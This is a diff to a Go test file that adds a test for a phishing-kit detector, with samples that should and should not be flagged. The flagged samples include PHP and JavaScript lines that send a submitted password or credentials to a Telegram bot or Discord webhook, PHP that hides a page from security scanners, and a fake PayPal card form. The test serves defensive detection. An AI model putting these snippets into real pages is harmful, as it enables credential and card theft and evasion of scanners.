@@ -267,3 +267,25 @@ func TestWhatACommandWroteIsHeldToTheRules(t *testing.T) {
 		t.Fatalf("a file the command wrote must be caught: %v", bad)
 	}
 }
+
+func TestPhishingKitsAreNamedForReviewAndOrdinaryPagesAreNot(t *testing.T) {
+	for code, want := range map[string]string{
+		`<?php file_get_contents("https://api.telegram.org/bot123:ABC/sendMessage?chat_id=1&text=".urlencode($_POST["pass"]));`: "sends data to a Telegram bot",
+		`fetch("https://discord.com/api/webhooks/1/abc", {method: "POST", body: JSON.stringify(creds)})`:                        "sends data to a Discord webhook",
+		`<?php if (preg_match('/phishtank|netcraft|google/i', $_SERVER['HTTP_USER_AGENT'])) { http_response_code(404); exit; }`: "hides the page from security scanners",
+		`<h1>PayPal</h1><form><input name="cvv"><input autocomplete="cc-number"></form>`:                                        "asks for a card number beside a well-known brand",
+	} {
+		if got := phishingKit(code); got != want {
+			t.Errorf("%.50q: got %q, want %q", code, got, want)
+		}
+	}
+	for _, code := range []string{
+		`<form><input autocomplete="cc-number" name="card"></form><p>Pay for your coffee</p>`,
+		`<?php Log::info('visit', ['ua' => $request->userAgent()]);`,
+		`<a href="https://t.me/ourshop">Telegram channel</a>`,
+	} {
+		if got := phishingKit(code); got != "" {
+			t.Errorf("ordinary page flagged (%s): %.60q", got, code)
+		}
+	}
+}
